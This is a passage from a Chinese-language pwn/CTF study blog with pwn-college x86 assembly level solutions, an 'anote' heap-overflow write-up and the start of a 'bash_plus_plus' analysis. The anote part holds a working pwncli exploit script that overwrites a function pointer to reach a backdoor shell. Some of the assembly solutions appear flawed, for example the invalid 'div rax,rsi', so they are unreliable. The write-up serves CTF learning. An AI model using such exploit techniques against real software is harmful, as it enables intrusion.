class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">Often though, you want more than just a single &#x27;if-else&#x27;.</span><br><span class="line"></span><br><span class="line">Sometimes you want two if checks, followed by an else.</span><br><span class="line"></span><br><span class="line">To do this, you need to make sure that you have control flow that &#x27;falls-through&#x27; to the next `if` after it fails.</span><br><span class="line"></span><br><span class="line">All must jump to the same `done` after execution to avoid the else.</span><br><span class="line"></span><br><span class="line">There are many jump types in x86, it will help to learn how they can be used.</span><br><span class="line"></span><br><span class="line">Nearly all of them rely on something called the ZF, the Zero Flag.</span><br><span class="line"></span><br><span class="line">The ZF is set to 1 when a cmp is equal. 0 otherwise.</span><br><span class="line"></span><br><span class="line">Using the above knowledge, implement the following:</span><br><span class="line">  if [x] is 0x7f454c46:</span><br><span class="line">    y = [x+4] + [x+8] + [x+12]</span><br><span class="line">  else if [x] is 0x00005A4D:</span><br><span class="line">    y = [x+4] - [x+8] - [x+12]</span><br><span class="line">  else:</span><br><span class="line">    y = [x+4] * [x+8] * [x+12]</span><br><span class="line"></span><br><span class="line">where:</span><br><span class="line">  x = rdi, y = rax.</span><br><span class="line"></span><br><span class="line">Assume each dereferenced value is a signed dword.</span><br><span class="line">This means the values can start as a negative value at each memory position.</span><br><span class="line"></span><br><span class="line">A valid solution will use the following at least once:</span><br><span class="line">  jmp (any variant), cmp</span><br><span class="line"></span><br><span class="line">We will now run multiple tests on your code, here is an example run:</span><br><span class="line">  (data) [0x404000] = &#123;4 random dwords]&#125;</span><br><span class="line">  rdi = 0x404000</span><br></pre></td></tr></table></figure>



<p>关卡提示使用条件跳转，并讲解了ZF（零标志）</p>
<p>要求实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [x] is 0x7f454c46:</span><br><span class="line">y = [x+4] + [x+8] + [x+12]</span><br><span class="line">else if [x] is 0x00005A4D:</span><br><span class="line">y = [x+4] - [x+8] - [x+12]</span><br><span class="line">else:</span><br><span class="line">y = [x+4] * [x+8] * [x+12]</span><br><span class="line">其中：</span><br><span class="line">x = rdi，y = rax。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   mov eax,[rdi+4]</span><br><span class="line">   mov ebx,[rdi+8]</span><br><span class="line">   mov ecx,[rdi+12]</span><br><span class="line">   mov edx,[rdi]</span><br><span class="line"></span><br><span class="line">   cmp edx ,0x7f454c46</span><br><span class="line">   jne label1</span><br><span class="line">   add eax,ebx</span><br><span class="line">   add eax,ecx</span><br><span class="line">   jmp done</span><br><span class="line"></span><br><span class="line">   label1:</span><br><span class="line"> </span><br><span class="line">   cmp edx,0x00005A4D</span><br><span class="line">   jne label2</span><br><span class="line">   sub eax,ebx</span><br><span class="line">   sub eax,ecx</span><br><span class="line">   jmp done</span><br><span class="line"></span><br><span class="line">   label2:</span><br><span class="line">   imul eax,ebx</span><br><span class="line">   imul eax,ecx</span><br><span class="line"></span><br><span class="line">   done:</span><br><span class="line">   nop</span><br></pre></td></tr></table></figure>



<h1 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this level you will be working with control flow manipulation. This involves using instructions</span><br><span class="line">to both indirectly and directly control the special register `rip`, the instruction pointer.</span><br><span class="line">You will use instructions such as: jmp, call, cmp, and their alternatives to implement the requested behavior.</span><br><span class="line"></span><br><span class="line">We will be testing your code multiple times in this level with dynamic values! This means we will</span><br><span class="line">be running your code in a variety of random ways to verify that the logic is robust enough to</span><br><span class="line">survive normal use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The last jump type is the indirect jump, which is often used for switch statements in the real world.</span><br><span class="line"></span><br><span class="line">Switch statements are a special case of if-statements that use only numbers to determine where the control flow will go.</span><br><span class="line"></span><br><span class="line">Here is an example:</span><br><span class="line">  switch(number):</span><br><span class="line">    0: jmp do_thing_0</span><br><span class="line">    1: jmp do_thing_1</span><br><span class="line">    2: jmp do_thing_2</span><br><span class="line">    default: jmp do_default_thing</span><br><span class="line"></span><br><span class="line">The switch in this example is working on `number`, which can either be 0, 1, or 2.</span><br><span class="line"></span><br><span class="line">In the case that `number` is not one of those numbers, the default triggers.</span><br><span class="line"></span><br><span class="line">You can consider this a reduced else-if type structure.</span><br><span class="line"></span><br><span class="line">In x86, you are already used to using numbers, so it should be no suprise that you can make if statements based on something being an exact number.</span><br><span class="line"></span><br><span class="line">In addition, if you know the range of the numbers, a switch statement works very well.</span><br><span class="line"></span><br><span class="line">Take for instance the existence of a jump table.</span><br><span class="line"></span><br><span class="line">A jump table is a contiguous section of memory that holds addresses of places to jump.</span><br><span class="line"></span><br><span class="line">In the above example, the jump table could look like:</span><br><span class="line">  [0x1337] = address of do_thing_0</span><br><span class="line">  [0x1337+0x8] = address of do_thing_1</span><br><span class="line">  [0x1337+0x10] = address of do_thing_2</span><br><span class="line">  [0x1337+0x18] = address of do_default_thing</span><br><span class="line"></span><br><span class="line">Using the jump table, we can greatly reduce the amount of cmps we use.</span><br><span class="line"></span><br><span class="line">Now all we need to check is if `number` is greater than 2.</span><br><span class="line"></span><br><span class="line">If it is, always do:</span><br><span class="line">  jmp [0x1337+0x18]</span><br><span class="line">Otherwise:</span><br><span class="line">  jmp [jump_table_address + number * 8]</span><br><span class="line"></span><br><span class="line">Using the above knowledge, implement the following logic:</span><br><span class="line">  if rdi is 0:</span><br><span class="line">    jmp 0x403034</span><br><span class="line">  else if rdi is 1:</span><br><span class="line">    jmp 0x403100</span><br><span class="line">  else if rdi is 2:</span><br><span class="line">    jmp 0x4031de</span><br><span class="line">  else if rdi is 3:</span><br><span class="line">    jmp 0x40326c</span><br><span class="line">  else:</span><br><span class="line">    jmp 0x403360</span><br><span class="line"></span><br><span class="line">Please do the above with the following constraints:</span><br><span class="line">  Assume rdi will NOT be negative</span><br><span class="line">  Use no more than 1 cmp instruction</span><br><span class="line">  Use no more than 3 jumps (of any variant)</span><br><span class="line">  We will provide you with the number to &#x27;switch&#x27; on in rdi.</span><br><span class="line">  We will provide you with a jump table base address in rsi.</span><br><span class="line"></span><br><span class="line">Here is an example table:</span><br><span class="line">  [0x404096] = 0x403034 (addrs will change)</span><br><span class="line">  [0x40409e] = 0x403100</span><br><span class="line">  [0x4040a6] = 0x4031de</span><br><span class="line">  [0x4040ae] = 0x40326c</span><br><span class="line">  [0x4040b6] = 0x403360</span><br></pre></td></tr></table></figure>

<p>关卡要求使用跳转表实现类似switch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   cmp rdi,4</span><br><span class="line">   jae deafult</span><br><span class="line">   jmp [rsi + rdi * 8]</span><br><span class="line">   jmp end</span><br><span class="line">   deafult:</span><br><span class="line">   jmp [rsi+4*8]</span><br><span class="line">   end:</span><br><span class="line">   nop</span><br></pre></td></tr></table></figure>

<p>使用两个标签，end和deafult，根据rdi不同的值跳转到不同的地址</p>
<h1 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In a previous level you computed the average of 4 integer quad words, which</span><br><span class="line">was a fixed amount of things to compute, but how do you work with sizes you get when</span><br><span class="line">the program is running?</span><br><span class="line"></span><br><span class="line">In most programming languages a structure exists called the</span><br><span class="line">for-loop, which allows you to do a set of instructions for a bounded amount of times.</span><br><span class="line">The bounded amount can be either known before or during the programs run, during meaning</span><br><span class="line">the value is given to you dynamically.</span><br><span class="line"></span><br><span class="line">As an example, a for-loop can be used to compute the sum of the numbers 1 to n:</span><br><span class="line">  sum = 0</span><br><span class="line">  i = 1</span><br><span class="line">  while i &lt;= n:</span><br><span class="line">    sum += i</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">Please compute the average of n consecutive quad words, where:</span><br><span class="line">  rdi = memory address of the 1st quad word</span><br><span class="line">  rsi = n (amount to loop for)</span><br><span class="line">  rax = average computed</span><br><span class="line"></span><br><span class="line">We will now set the following in preparation for your code:</span><br><span class="line">  [0x4040a0:0x404398] = &#123;n qwords]&#125;</span><br><span class="line">  rdi = 0x4040a0</span><br><span class="line">  rsi = 95</span><br></pre></td></tr></table></figure>

<p>本关要实现循环，计算n个值的平均数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   xor rax,rax </span><br><span class="line">   mov rbx,0</span><br><span class="line">   </span><br><span class="line">   loop:</span><br><span class="line">   cmp rsi,rbx</span><br><span class="line">   jz cac</span><br><span class="line">   add rax,[rdi+8*rbx]</span><br><span class="line">   inc rbx</span><br><span class="line">   jmp loop</span><br><span class="line"></span><br><span class="line">   cac:</span><br><span class="line">   div rax,rsi</span><br></pre></td></tr></table></figure>

<p>首先设置rbx为循环次数，当rbx小于rsi时继续循环，将值不断加到rax中，最终跳出循环后除以rsi</p>
<h1 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In previous levels you discovered the for-loop to iterate for a *number* of times, both dynamically and</span><br><span class="line">statically known, but what happens when you want to iterate until you meet a condition?</span><br><span class="line"></span><br><span class="line">A second loop structure exists called the while-loop to fill this demand.</span><br><span class="line"></span><br><span class="line">In the while-loop you iterate until a condition is met.</span><br><span class="line"></span><br><span class="line">As an example, say we had a location in memory with adjacent numbers and we wanted</span><br><span class="line">to get the average of all the numbers until we find one bigger or equal to 0xff:</span><br><span class="line">  average = 0</span><br><span class="line">  i = 0</span><br><span class="line">  while x[i] &lt; 0xff:</span><br><span class="line">    average += x[i]</span><br><span class="line">    i += 1</span><br><span class="line">  average /= i</span><br><span class="line"></span><br><span class="line">Using the above knowledge, please perform the following:</span><br><span class="line">  Count the consecutive non-zero bytes in a contiguous region of memory, where:</span><br><span class="line">    rdi = memory address of the 1st byte</span><br><span class="line">    rax = number of consecutive non-zero bytes</span><br><span class="line"></span><br><span class="line">Additionally, if rdi = 0, then set rax = 0 (we will check)!</span><br><span class="line"></span><br><span class="line">An example test-case, let:</span><br><span class="line">  rdi = 0x1000</span><br><span class="line">  [0x1000] = 0x41</span><br><span class="line">  [0x1001] = 0x42</span><br><span class="line">  [0x1002] = 0x43</span><br><span class="line">  [0x1003] = 0x00</span><br><span class="line"></span><br><span class="line">then: rax = 3 should be set</span><br><span class="line"></span><br><span class="line">We will now run multiple tests on your code, here is an example run:</span><br><span class="line">  (data) [0x404000] = &#123;10 random bytes&#125;,</span><br><span class="line">  rdi = 0x404000</span><br></pre></td></tr></table></figure>



<p>本关要求实现while循环，要求循环全部连续非零字节数</p>
<p>本关还有当rdi&#x3D;0时rax&#x3D;0的特殊检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   xor rax,rax </span><br><span class="line">   xor rbx,rbx</span><br><span class="line">   cmp rdi,0</span><br><span class="line">   jz end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   loop:</span><br><span class="line">   cmp rbx,[rdi]</span><br><span class="line">   jae end</span><br><span class="line">   inc rax</span><br><span class="line">   inc rdi</span><br><span class="line">   jmp loop</span><br><span class="line"></span><br><span class="line">   end:</span><br><span class="line">   nop</span><br></pre></td></tr></table></figure>

<h1 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In previous levels you implemented a while loop to count the number of</span><br><span class="line">consecutive non-zero bytes in a contiguous region of memory.</span><br><span class="line"></span><br><span class="line">In this level you will be provided with a contiguous region of memory again and will loop</span><br><span class="line">over each performing a conditional operation till a zero byte is reached.</span><br><span class="line">All of which will be contained in a function!</span><br><span class="line"></span><br><span class="line">A function is a callable segment of code that does not destroy control flow.</span><br><span class="line"></span><br><span class="line">Functions use the instructions &quot;call&quot; and &quot;ret&quot;.</span><br><span class="line"></span><br><span class="line">The &quot;call&quot; instruction pushes the memory address of the next instruction onto</span><br><span class="line">the stack and then jumps to the value stored in the first argument.</span><br><span class="line"></span><br><span class="line">Let&#x27;s use the following instructions as an example:</span><br><span class="line">  0x1021 mov rax, 0x400000</span><br><span class="line">  0x1028 call rax</span><br><span class="line">  0x102a mov [rsi], rax</span><br><span class="line"></span><br><span class="line">1. call pushes 0x102a, the address of the next instruction, onto the stack.</span><br><span class="line">2. call jumps to 0x400000, the value stored in rax.</span><br><span class="line"></span><br><span class="line">The &quot;ret&quot; instruction is the opposite of &quot;call&quot;.</span><br><span class="line"></span><br><span class="line">ret pops the top value off of the stack and jumps to it.</span><br><span class="line"></span><br><span class="line">Let&#x27;s use the following instructions and stack as an example:</span><br><span class="line"></span><br><span class="line">                              Stack ADDR  VALUE</span><br><span class="line">  0x103f mov rax, rdx         RSP + 0x8   0xdeadbeef</span><br><span class="line">  0x1042 ret                  RSP + 0x0   0x0000102a</span><br><span class="line"></span><br><span class="line">Here, ret will jump to 0x102a</span><br><span class="line"></span><br><span class="line">Please implement the following logic:</span><br><span class="line">  str_lower(src_addr):</span><br><span class="line">    i = 0</span><br><span class="line">    if src_addr != 0:</span><br><span class="line">      while [src_addr] != 0x00:</span><br><span class="line">        if [src_addr] &lt;= 0x5a:</span><br><span class="line">          [src_addr] = foo([src_addr])</span><br><span class="line">          i += 1</span><br><span class="line">        src_addr += 1</span><br><span class="line">    return i</span><br><span class="line"></span><br><span class="line">foo is provided at 0x403000.</span><br><span class="line">foo takes a single argument as a value and returns a value.</span><br><span class="line"></span><br><span class="line">All functions (foo and str_lower) must follow the Linux amd64 calling convention (also known as System V AMD64 ABI):</span><br><span class="line">  https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI</span><br><span class="line"></span><br><span class="line">Therefore, your function str_lower should look for src_addr in rdi and place the function return in rax.</span><br><span class="line"></span><br><span class="line">An important note is that src_addr is an address in memory (where the string is located) and [src_addr] refers to the byte that exists at src_addr.</span><br><span class="line"></span><br><span class="line">Therefore, the function foo accepts a byte as its first argument and returns a byte.</span><br><span class="line"></span><br><span class="line">We will now run multiple tests on your code, here is an example run:</span><br><span class="line">  (data) [0x404000] = &#123;10 random bytes&#125;,</span><br><span class="line">  rdi = 0x404000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本关要求实现一个函数，遵循linux amd64调用约定</p>
<p><a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI">https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI</a></p>
<p>使用rbx作为src_addr，r10来当作i</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   xor r10,r10</span><br><span class="line">   cmp rdi,0</span><br><span class="line">   jz zero</span><br><span class="line"></span><br><span class="line">   loop:</span><br><span class="line">   mov rbx,rdi</span><br><span class="line">   mov rax,0x403000</span><br><span class="line">   xor rdi,rdi</span><br><span class="line">   mov dil,byte ptr [rbx]</span><br><span class="line">   cmp dil,0</span><br><span class="line">   je zero</span><br><span class="line">   cmp dil,0x5a</span><br><span class="line">   jg loop1</span><br><span class="line">   inc r10</span><br><span class="line">   call rax</span><br><span class="line">   mov byte ptr [rbx],al </span><br><span class="line">   </span><br><span class="line">   loop1:</span><br><span class="line">   mov rdi,rbx # 最后将rbx的结果返还给rdi</span><br><span class="line">   inc rdi</span><br><span class="line">   jmp loop</span><br><span class="line"></span><br><span class="line">   zero:</span><br><span class="line">   mov rax,r10</span><br><span class="line">   ret</span><br></pre></td></tr></table></figure>

<h1 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In the previous level, you learned how to make your first function and how to call other functions.</span><br><span class="line"></span><br><span class="line">Now we will work with functions that have a function stack frame.</span><br><span class="line"></span><br><span class="line">A function stack frame is a set of pointers and values pushed onto the stack to save things for later use and allocate space on the stack for function variables.</span><br><span class="line"></span><br><span class="line">First, let&#x27;s talk about the special register rbp, the Stack Base Pointer.</span><br><span class="line"></span><br><span class="line">The rbp register is used to tell where our stack frame first started.</span><br><span class="line"></span><br><span class="line">As an example, say we want to construct some list (a contigous space of memory) that is only used in our function.</span><br><span class="line"></span><br><span class="line">The list is 5 elements long, and each element is a dword.</span><br><span class="line"></span><br><span class="line">A list of 5 elements would already take 5 registers, so instead, we can make space on the stack!</span><br><span class="line"></span><br><span class="line">The assembly would look like:</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">; setup the base of the stack as the current top</span><br><span class="line">mov rbp, rsp</span><br><span class="line">; move the stack 0x14 bytes (5 * 4) down</span><br><span class="line">; acts as an allocation</span><br><span class="line">sub rsp, 0x14</span><br><span class="line">; assign list[2] = 1337</span><br><span class="line">mov eax, 1337</span><br><span class="line">mov [rbp-0x8], eax</span><br><span class="line">; do more operations on the list ...</span><br><span class="line">; restore the allocated space</span><br><span class="line">mov rsp, rbp</span><br><span class="line">ret</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">Notice how rbp is always used to restore the stack to where it originally was.</span><br><span class="line"></span><br><span class="line">If we don&#x27;t restore the stack after use, we will eventually run out.</span><br><span class="line"></span><br><span class="line">In addition, notice how we subtracted from rsp, because the stack grows down.</span><br><span class="line"></span><br><span class="line">To make the stack have more space, we subtract the space we need.</span><br><span class="line"></span><br><span class="line">The ret and call still works the same.</span><br><span class="line"></span><br><span class="line">Once, again, please make function(s) that implements the following:</span><br><span class="line">most_common_byte(src_addr, size):</span><br><span class="line">  i = 0</span><br><span class="line">  while i &lt;= size-1:</span><br><span class="line">    curr_byte = [src_addr + i]</span><br><span class="line">    [stack_base - curr_byte] += 1</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">  b = 0</span><br><span class="line">  max_freq = 0</span><br><span class="line">  max_freq_byte = 0</span><br><span class="line">  while b &lt;= 0xff:</span><br><span class="line">    if [stack_base - b] &gt; max_freq:</span><br><span class="line">      max_freq = [stack_base - b]</span><br><span class="line">      max_freq_byte = b</span><br><span class="line">    b += 1</span><br><span class="line"></span><br><span class="line">  return max_freq_byte</span><br><span class="line"></span><br><span class="line">Assumptions:</span><br><span class="line">  There will never be more than 0xffff of any byte</span><br><span class="line">  The size will never be longer than 0xffff</span><br><span class="line">  The list will have at least one element</span><br><span class="line">Constraints:</span><br><span class="line">  You must put the &quot;counting list&quot; on the stack</span><br><span class="line">  You must restore the stack like in a normal function</span><br><span class="line">  You cannot modify the data at src_addr</span><br></pre></td></tr></table></figure>

<p>本关要求创建一个具有堆栈框架函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global most_common_byte</span><br><span class="line"></span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">most_common_byte:</span><br><span class="line">    mov rbp,rsp</span><br><span class="line">    sub rsp,0x100</span><br><span class="line">    xor r10,r10</span><br><span class="line">    </span><br><span class="line">    loop1:</span><br><span class="line">    cmp r10,rsi</span><br><span class="line">    jge a</span><br><span class="line">    mov dl,byte ptr [rdi+r10]</span><br><span class="line">    add byte ptr [rsp+rdx],1</span><br><span class="line">    inc r10</span><br><span class="line">    jmp loop1</span><br><span class="line"></span><br><span class="line">    a:</span><br><span class="line">    xor rbx,rbx</span><br><span class="line">    xor rcx,rcx</span><br><span class="line">    xor rax,rax</span><br><span class="line">    jmp loop2</span><br><span class="line"></span><br><span class="line">    loop2:</span><br><span class="line">    cmp rbx,0xff</span><br><span class="line">    jg b</span><br><span class="line">    cmp [rsp+rbx],cl</span><br><span class="line">    jle c</span><br><span class="line">    mov cl,[rsp+rbx]</span><br><span class="line">    mov rax,rbx</span><br><span class="line">    </span><br><span class="line">    c:</span><br><span class="line">    inc rbx</span><br><span class="line">    jmp loop2</span><br><span class="line">    </span><br><span class="line">    b:</span><br><span class="line">    mov rsp,rbp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwn-college</tag>
      </tags>
  </entry>
  <entry>
    <title>pwncpp</title>
    <url>/2024/12/19/pwncpp/</url>
    <content><![CDATA[<h1 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h1><p>堆溢出，这个反编译挺恶心的</p>
<p>允许创建9个chunk</p>
<p>有add，show，和edit</p>
<p>洞在edit，允许最多输入0x28，同时edit结束后会调用堆块中某个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">std::istream::getline(&amp;std::cin, &amp;src, 0x20);</span><br><span class="line">sub_8048A86(*(&amp;v25 + v20), &amp;src, v20, n);</span><br><span class="line">(***(&amp;v25 + v20))(*(&amp;v25 + v20));</span><br></pre></td></tr></table></figure>

<p>show给泄露堆地址</p>
<p>add创建0x20大小的chunk</p>
<p>调用函数正好在chunk的fd处</p>
<p>先用show泄露堆基址，再通过chunk0覆写chunk1的调用函数的地址，程序内部有backdoor</p>
<p>将backdoor的地址写到chunk0内</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from hashlib import shake_128</span><br><span class="line">from pwncli import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add():</span><br><span class="line">    sla(&quot;Choice&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;Choice&gt;&gt;&quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, len, content):</span><br><span class="line">    sla(&quot;Choice&gt;&gt;&quot;, &quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line">    sla(&quot;len: &quot;, str(len))</span><br><span class="line">    sla(&quot;content: &quot;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = 0x80489CE</span><br><span class="line">add()</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;gift: 0x&quot;)</span><br><span class="line">shell_addr = int(io.recvuntil(&quot;\n&quot;, drop=True), 16)</span><br><span class="line">log_address_ex(&quot;shell_addr&quot;)</span><br><span class="line">add()</span><br><span class="line">payload = p32(shell) + b&quot;a&quot; * 0xC + p32(0) + p32(0x21) + p32(shell_addr + 8)</span><br><span class="line"></span><br><span class="line">edit(0, 0x1C, payload)</span><br><span class="line">edit(1, 1, &quot;a&quot;)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="bash-plus-plus"><a href="#bash-plus-plus" class="headerlink" title="bash_plus_plus"></a>bash_plus_plus</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>lakectf的题，给了源码，直接看源码就行</p>
<p>模拟了一个bash，可用<code>$a=123</code>或<code>$a=abc</code>这种格式设置变量，变量结构如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum TYPE &#123;</span><br><span class="line">    LONG,</span><br><span class="line">    STRING</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Variable &#123;</span><br><span class="line">    public:</span><br><span class="line">        TYPE type;</span><br><span class="line">        union &#123;</span><br><span class="line">            long l;</span><br><span class="line">            char* s;</span><br><span class="line">        &#125; value;</span><br><span class="line">        </span><br><span class="line">        Variable(long l) : type(LONG) &#123;</span><br><span class="line">            value.l = l;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Variable(const char* s) : type(STRING) &#123;</span><br><span class="line">            value.s = strdup(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtual void print() &#123;</span><br><span class="line">            std::cout &lt;&lt; &quot;Default print&quot; &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class longVariable : public Variable &#123;</span><br><span class="line">    public:</span><br><span class="line">        longVariable(long l) : Variable(l) &#123;&#125;</span><br><span class="line">        void print() override &#123;</span><br><span class="line">            std::cout &lt;&lt; value.l &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class stringVariable : public Variable &#123;</span><br><span class="line">    public:</span><br><span class="line">        stringVariable(const char* s) : Variable(s) &#123;&#125;</span><br><span class="line">        void print() override &#123;</span><br><span class="line">            std::cout &lt;&lt; value.s &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>变量有TYPE，可以是STRING和LONG，有print这个打印函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">void setvar(const char* name, const char* p) &#123;</span><br><span class="line">    char *strval;</span><br><span class="line">    long longval = std::strtol(p + 1, &amp;strval, 10);</span><br><span class="line"></span><br><span class="line">    if (*strval) &#123;</span><br><span class="line">        variables[name] = new stringVariable(strval);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        variables[name] = new longVariable(longval);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    variables[name]-&gt;print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$(($a+$b))</code>用这种格式来进行计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void process_arithmetic(char* cmd) &#123;</span><br><span class="line">    char *p = std::strchr(cmd, &#x27;)&#x27;);</span><br><span class="line"></span><br><span class="line">    if (!p) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Invalid command&quot; &lt;&lt; std::endl;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *p = 0;</span><br><span class="line"></span><br><span class="line">    char *op = std::strchr(cmd, &#x27;+&#x27;);</span><br><span class="line">    long a, b;</span><br><span class="line">    if (op) &#123;</span><br><span class="line">        *op = 0;</span><br><span class="line">        a = getLongVar(cmd+1);</span><br><span class="line">        b = getLongVar(op + 2);</span><br><span class="line">        std::cout &lt;&lt; a + b &lt;&lt; std::endl;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        op = std::strchr(cmd, &#x27;-&#x27;);</span><br><span class="line">        if (op) &#123;</span><br><span class="line">            *op = 0;</span><br><span class="line">            a = getLongVar(cmd+1);</span><br><span class="line">            b = getLongVar(op + 2);</span><br><span class="line">            std::cout &lt;&lt; a - b &lt;&lt; std::endl;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            op = std::strchr(cmd, &#x27;*&#x27;);</span><br><span class="line">            if (op) &#123;</span><br><span class="line">                *op = 0;</span><br><span class="line">                a = getLongVar(cmd+1);</span><br><span class="line">                b = getLongVar(op + 2);</span><br><span class="line">                std::cout &lt;&lt; a * b &lt;&lt; std::endl;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                op = std::strchr(cmd+1, &#x27;/&#x27;);</span><br><span class="line">                if (op) &#123;</span><br><span class="line">                    *op = 0;</span><br><span class="line">                    a = getLongVar(cmd+1);</span><br><span class="line">                    b = getLongVar(op + 2);</span><br><span class="line">                    std::cout &lt;&lt; a / b &lt;&lt; std::endl;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    std::cout &lt;&lt; &quot;Invalid operation&quot; &lt;&lt; std::endl;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是STRING，会打印出对应字符串</p>
